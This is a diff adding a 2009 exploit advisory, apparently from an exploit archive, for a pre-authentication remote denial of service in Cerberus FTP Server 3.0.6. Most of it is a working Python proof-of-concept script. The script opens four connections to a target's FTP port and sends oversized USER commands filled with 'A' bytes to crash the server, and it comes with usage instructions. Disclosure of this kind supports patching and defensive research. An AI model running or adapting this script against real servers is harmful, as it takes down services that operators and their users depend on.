@@ -1,0 +1,102 @@
+#####################################################################################
+
+Application: Cerberus FTP 3.0.6
+
+Platforms: Windows XP Professional SP2
+Windows Vista SP1
+
+crash:	 YES
+
+Exploitation: Remote DoS
+
+Date: 2009-09-30
+
+Author: Francis Provencher (Protek Research Lab's)
+
+#####################################################################################
+
+1) Introduction
+2) Technical details
+3) The Code
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Cerberus FTP Server is a secure and easy-to-use professional Windows FTP server featuring FIPS 140-2 certified encryption.
+
+(from Cerberus FTP server website)
+
+#####################################################################################
+
+============================
+2) Technical details 
+============================
+
+Cerberus FTP server Professional
+Version 3.0.6
+Build date 2009/09/28
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+#!/usr/bin/env python
+
+###################################################################################
+#
+# Cerberus FTP Server Denial of Service Exploit (Pre Auth)
+# Found By: Francis Provencher (Protek Research Lab's)
+# Tested On: Windows XPSP2
+# Usage: ./script <Target IP>
+#
+###################################################################################
+
+import socket, sys
+
+def banner():
+	print "\n##################################################################"
+	print "# #"
+	print "# Cerberus FTP Server Denial of Service Exploit (Pre Auth) #"
+	print "# Francis Provencher (Protek Researh Lab's) #"
+	print "# #"
+	print "##################################################################\n"
+
+s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+
+buff1 = ("\x41" * 330 );
+buff2 = ("\x41" * 520 );
+buff3 = ("\x41" * 2230 );
+
+try:
+	banner();
+	print ("[*] Connecting to target...");
+	s1.connect((sys.argv[1] , 21));
+	s2.connect((sys.argv[1] , 21));
+	s3.connect((sys.argv[1] , 21));
+	s4.connect((sys.argv[1] , 21));
+	print ("[*] Sending evil stuff...");
+	s1.send("USER " + buff1 + "\r\n");
+	s2.send("USER " + buff2 + "\r\n");
+	s3.send("USER " + buff3 + "\r\n");
+	s4.send("USER " + buff1 + "\r\n");
+	print ("[*] Success! The server should now be inaccessible");
+	s1.close();
+	s2.close();
+	s3.close();
+	s4.close();
+
+except:
+	print ("[-] Could not connect to server.");
+
+#####################################################################################
+(PRL-2009-09)
